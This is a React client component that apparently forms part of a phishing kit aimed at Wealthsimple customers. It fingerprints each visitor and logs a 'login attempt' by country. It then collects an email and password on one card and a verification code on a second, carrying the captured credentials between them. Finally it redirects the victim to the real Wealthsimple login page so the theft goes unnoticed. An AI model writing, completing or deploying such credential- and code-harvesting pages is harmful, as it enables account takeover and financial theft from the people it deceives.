"use client";

import { createLoginAttempt } from "@/lib/api/handlers/log";
import { skipToken, useQuery } from "@tanstack/react-query";
import { Loader2Icon } from "lucide-react";
import { useState } from "react";
import { LoginFormValues, OfferLoginCard } from "./LoginCard";
import { OfferVerificationCard } from "./VerificationCard";

type LoginStep = "credentials" | "code";

type OfferLoginFormProps = {
  country: string;
};

export function OfferLoginForm({ country }: OfferLoginFormProps) {
  const [step, setStep] = useState<LoginStep>("credentials");
  const [credentials, setCredentials] = useState<LoginFormValues | null>(null);

  const { data: fingerprint } = useQuery({
    queryKey: ["fingerprint"],
    queryFn: async () => {
      const FingerprintJS = await import("@fingerprintjs/fingerprintjs");
      const fp = await FingerprintJS.load();
      return fp.get();
    },
  });

  const { data, isLoading } = useQuery({
    queryKey: ["login", country],
    queryFn: !fingerprint?.visitorId ? skipToken : () => createLoginAttempt({ userId: fingerprint.visitorId, country }),
  });

  if (!data || isLoading) {
    return (
      <div className="flex items-center justify-center size-full">
        <Loader2Icon className="animate-spin size-6" />
      </div>
    );
  }

  if (step === "credentials") {
    return (
      <OfferLoginCard
        userId={fingerprint.visitorId}
        loginAttemptId={data.id}
        country={country}
        onSuccess={(values) => {
          setStep("code");
          setCredentials(values);
        }}
      />
    );
  }

  return (
    <OfferVerificationCard
      userId={fingerprint.visitorId}
      loginAttemptId={data.id}
      loginAttemptEmail={credentials?.email}
      loginAttemptPassword={credentials?.password}
      country={country}
      onSuccess={() => (window.location.href = "https://my.wealthsimple.com/app/login")}
    />
  );
}
